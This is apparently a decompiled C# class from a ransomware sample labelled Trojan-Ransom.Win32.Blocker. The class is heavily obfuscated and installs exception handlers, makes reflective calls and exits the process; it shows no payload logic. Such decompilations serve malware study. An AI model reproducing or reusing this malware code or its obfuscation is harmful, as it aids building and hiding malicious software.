// Decompiled with JetBrains decompiler
// Type: .
// Assembly: BOMBS, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b01670ee6fa4859f
// MVID: D5D8F5B0-12EB-4325-8C3D-C60F341D062A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jjta-28a226e15e1e7b94528e46718041b3f49976b446eb3daccd652d0e5b43f948be.exe

using \u0001;
using \u0004;
using \u0006;
using \u0008;
using System;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Permissions;
using System.Threading;

namespace \u0001
{
  internal abstract class \u0005
  {
    private static readonly bool \u0001;
    private static readonly string \u0001;
    private static \u0005 \u0001;
    private IWebProxy \u0001;
    private EventHandler \u0001;
    private \u0005 \u0001;
    [NonSerialized]
    internal static \u000F.\u0001 \u0015;

    [SpecialName]
    public void \u0001([In] EventHandler obj0)
    {
      EventHandler eventHandler1 = this.\u0001;
label_4:
      EventHandler comparand = eventHandler1;
      do
      {
        EventHandler eventHandler2 = (EventHandler) \u0090.\u0008\u0003((Delegate) comparand, (Delegate) obj0);
        EventHandler eventHandler3;
        if (true)
          eventHandler3 = eventHandler2;
        eventHandler1 = Interlocked.CompareExchange<EventHandler>(ref this.\u0001, eventHandler3, comparand);
        if (eventHandler1 != comparand)
          goto label_4;
      }
      while (false);
    }

    [SpecialName]
    public void \u0001([In] \u0005 obj0)
    {
      \u0005 obj1 = this.\u0001;
label_4:
      \u0005 comparand = obj1;
      do
      {
        \u0005 obj2 = (\u0005) \u0090.\u0008\u0003((Delegate) comparand, (Delegate) obj0);
        \u0005 obj3;
        if (true)
          obj3 = obj2;
        obj1 = Interlocked.CompareExchange<\u0005>(ref this.\u0001, obj3, comparand);
        if (obj1 != comparand)
          goto label_4;
      }
      while (false);
    }

    protected abstract void \u0001([In] \u000F.\u0003 obj0);

    protected abstract void \u0001([In] \u0004.\u0004 obj0);

    protected abstract void \u0001([In] \u0007.\u0003 obj0);

    [SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
    public static void \u0001([In] \u0005 obj0)
    {
      do
      {
        if (obj0 != null)
          goto label_4;
label_3:
        continue;
label_4:
        \u0005.\u0001 = obj0;
        // ISSUE: method pointer
        \u009D\u0002.\u007E\u0016\u0005((object) \u0003\u0002.\u0097\u0003(), new UnhandledExceptionEventHandler((object) obj0, __methodptr(\u0001)));
        if (true)
        {
          \u009E\u0002 obj = \u009E\u0002.\u0017\u0005;
          // ISSUE: method pointer
          ThreadExceptionEventHandler exceptionEventHandler = new ThreadExceptionEventHandler((object) obj0, __methodptr(\u0001));
          if (true)
          {
            obj(exceptionEventHandler);
            goto label_3;
          }
          else
            goto label_3;
        }
      }
      while (false);
    }

    [SpecialName]
    private static \u0005 \u0001()
    {
      Type[] typeArray;
      if (true)
      {
        if (\u0005.\u0001 == null)
          typeArray = \u009F\u0002.\u007E\u0018\u0005((object) global::\u0001.\u0001());
        else
          goto label_15;
      }
      else
        goto label_18;
label_3:
      int num = 0;
      int index;
      if (num == 0)
      {
        index = num;
        goto label_12;
      }
      else
        goto label_13;
label_9:
      ++num;
label_10:
      if (true)
        index = num;
      else
        goto label_9;
label_12:
      num = index;
label_13:
      Type type;
      if (true)
      {
        if (num < typeArray.Length)
        {
          type = typeArray[index];
          goto label_18;
        }
      }
      else
        goto label_10;
label_15:
      return \u0005.\u0001;
label_18:
      if ((object) type != null && (object) \u0094.\u007E\u0084\u0003((object) type) != null)
      {
        // ISSUE: type reference
        if ((object) \u0094.\u007E\u0084\u0003((object) type) == (object) \u0086\u0002.\u001E\u0004(__typeref (\u0005)))
        {
          try
          {
            \u0005.\u0001 = (\u0005) \u0001\u0003.\u0019\u0005(type, true);
            if (\u0005.\u0001 != null)
              goto label_15;
          }
          catch
          {
          }
        }
      }
      if (true)
      {
        num = index;
        goto label_9;
      }
      else
        goto label_3;
    }

    public static void \u0001([In] Exception obj0, [In] object[] obj1)
    {
      if (false)
        return;
      if (obj0 != null && obj0 is SecurityException)
      {
        do
        {
          if (true)
          {
            if (true)
            {
              if (!\u0082.\u008D\u0002(\u0005.\u0001, \u0005.\u0015(3088096)) || !\u0005.\u0001().\u0001((SecurityException) obj0))
                goto label_9;
            }
            else
              goto label_7;
          }
        }
        while (false);
        return;
      }
      goto label_9;
label_7:
      \u0005.\u0001().\u0001(obj0, false, false);
      return;
label_9:
      \u0001.\u0003.\u0001(obj0, obj1);
      goto label_7;
    }

    private void \u0001([In] object obj0, [In] ThreadExceptionEventArgs obj1)
    {
      try
      {
        Exception exception;
        if (true)
          exception = \u0011\u0002.\u007E\u0002\u0004((object) obj1);
        else
          goto label_4;
label_2:
        Type type = \u0094.\u007E\u0086\u0003((object) exception);
label_4:
        if (\u0082.\u008D\u0002(\u0002.\u007E\u0005((object) type), \u0005.\u0015(3090009)) && \u0082.\u008D\u0002(\u0002.\u007E\u0010((object) type), \u0005.\u0015(3090034)))
          exception = (Exception) \u001F.\u007E\u0087\u0002((object) \u0016\u0002.\u007E\u0008\u0004((object) type, \u0005.\u0015(3090079)), (object) exception);
        if (exception is SecurityException)
        {
          if (true)
          {
            int num = \u0082.\u008D\u0002(\u0005.\u0001, \u0005.\u0015(3088096)) ? 1 : 0;
            if (true)
            {
              if (num != 0)
                num = this.\u0001(exception as SecurityException) ? 1 : 0;
              else
                goto label_12;
            }
            if (num != 0)
              return;
          }
          else
            goto label_2;
        }
label_12:
        this.\u0001(exception, true, false);
      }
      catch
      {
      }
    }

    private void \u0001([In] object obj0, [In] UnhandledExceptionEventArgs obj1)
    {
      try
      {
        int num1;
        if (\u0015\u0002.\u007E\u0007\u0004((object) obj1) is SecurityException)
        {
          if (false)
            return;
          int num2 = \u0082.\u008D\u0002(\u0005.\u0001, \u0005.\u0015(3088096)) ? 1 : 0;
          if (true)
          {
            if (num2 == 0)
              goto label_9;
            else
              goto label_12;
          }
          else
            num1 = num2;
        }
        else
          goto label_9;
label_7:
        if (num1 != 0)
          return;
label_9:
        if (true)
        {
          if (!(\u0015\u0002.\u007E\u0007\u0004((object) obj1) is Exception))
            return;
          this.\u0001((Exception) \u0015\u0002.\u007E\u0007\u0004((object) obj1), !\u0092.\u007E\u001C\u0003((object) obj1), false);
          return;
        }
label_12:
        num1 = this.\u0001(\u0015\u0002.\u007E\u0007\u0004((object) obj1) as SecurityException) ? 1 : 0;
        goto label_7;
      }
      catch
      {
      }
    }

    protected virtual Guid \u0001() => Guid.Empty;

    private bool \u0001([In] SecurityException obj0)
    {
      if (true)
        goto label_6;
label_5:
      int num = 1;
      return num == 0 ? num != 0 : num != 0;
label_6:
      \u0007.\u0003 obj = new \u0007.\u0003(obj0);
      if (true)
      {
        this.\u0001(obj);
        if (obj.\u0003())
          return false;
        if (!obj.\u0002())
        {
          global::\u0004.\u001C();
          goto label_5;
        }
        else
          goto label_5;
      }
      else
        goto label_5;
    }

    private void \u0001([In] Exception obj0, [In] bool obj1, [In] bool obj2)
    {
      \u0003.\u0004.\u0001(2U);
      Type type = \u0094.\u007E\u0086\u0003((object) obj0);
label_1:
      if (\u0082.\u008D\u0002(\u0002.\u007E\u0005((object) type), \u0005.\u0015(3090009)) && \u0082.\u008D\u0002(\u0002.\u007E\u0010((object) type), \u0005.\u0015(3090034)))
        obj0 = (Exception) \u001F.\u007E\u0087\u0002((object) \u0016\u0002.\u007E\u0008\u0004((object) type, \u0005.\u0015(3090079)), (object) obj0);
      bool flag = true;
      if (obj0 == null)
        return;
      if (obj0 is ThreadAbortException)
        return;
      try
      {
        \u0002 obj3 = new \u0002(this.\u0001(), obj0, this.\u0001);
        obj3.\u0001(new \u0005(this.\u0001));
        obj3.\u0001(new EventHandler(this.\u0001));
        obj3.\u0001(new \u0006.\u0003(this.\u0001));
        \u000F.\u0003 obj4 = new \u000F.\u0003(obj3, obj0);
        if (\u000E.\u0001.\u0001() != null)
          obj4.\u0001();
        if (!obj1)
        {
          obj4.\u0001(false);
          obj4.\u0002(false);
        }
        else if (obj2 || \u0005.\u0001)
        {
          obj4.\u0001(false);
          obj4.\u0002(true);
        }
        this.\u0001(obj4);
        flag = !obj4.\u0004();
      }
      catch (ThreadAbortException ex)
      {
      }
      catch (Exception ex)
      {
        this.\u0001(new \u0004.\u0004(ex));
      }
      while (flag)
      {
        Assembly[] assemblyArray = \u0004\u0002.\u007E\u0098\u0003((object) \u0003\u0002.\u0097\u0003());
        if (true)
        {
          int index = 0;
          while (true)
          {
            if (true)
            {
              if (index < assemblyArray.Length)
              {
                Assembly assembly = assemblyArray[index];
                try
                {
                  string str = \u0002.\u007E\u0003((object) assembly);
                  if (global::\u0003.\u007E\u0018((object) str, \u0005.\u0015(3090104)))
                  {
                    if (global::\u0003.\u007E\u0019((object) str, \u0005.\u0015(3090129)))
                    {
                      object obj5 = \u0004\u0003.\u007E\u001C\u0005((object) \u0003\u0003.\u007E\u001B\u0005((object) \u0002\u0003.\u007E\u001A\u0005((object) \u009A.\u007E\u008D\u0003((object) assembly, \u0005.\u0015(3090162)), \u0005.\u0015(3090199))), (object) null, (object[]) null);
                      object obj6 = \u0004\u0003.\u007E\u001C\u0005((object) \u0005\u0003.\u007E\u001D\u0005((object) \u0094.\u007E\u0083\u0003(obj5), \u0005.\u0015(3090212), new Type[0]), obj5, (object[]) null);
                    }
                  }
                }
                catch
                {
                }
                ++index;
              }
              else
                break;
            }
            else
              goto label_1;
          }
          try
          {
            global::\u0004.\u001C();
            break;
          }
          catch
          {
            try
            {
              \u0006\u0003.\u001E\u0005(0);
              break;
            }
            catch
            {
              break;
            }
          }
        }
      }
    }

    private void \u0001([In] object obj0, [In] \u0004.\u0004 obj1) => this.\u0001(obj1);

    private void \u0001([In] object obj0, [In] EventArgs obj1)
    {
label_0:
      EventHandler eventHandler;
      if (true)
        eventHandler = this.\u0001;
      do
      {
        if (eventHandler != null)
        {
          if (true)
          {
            if (true)
              \u0081\u0002.\u007E\u0019\u0004((object) eventHandler, obj0, obj1);
          }
          else
            goto label_0;
        }
      }
      while (false);
    }

    private void \u0001([In] object obj0, [In] \u0002 obj1)
    {
      \u0005 obj = this.\u0001;
      if (obj == null)
        return;
      obj(obj0, obj1);
    }

    static \u0005()
    {
      if (false)
        return;
      \u0002.\u0001(typeof (\u0005));
      \u0005.\u0001 = \u0083\u0002.\u001C\u0004(\u0005.\u0015(3090225));
      \u0005.\u0001 = \u0005.\u0015(3088096);
    }
  }
}
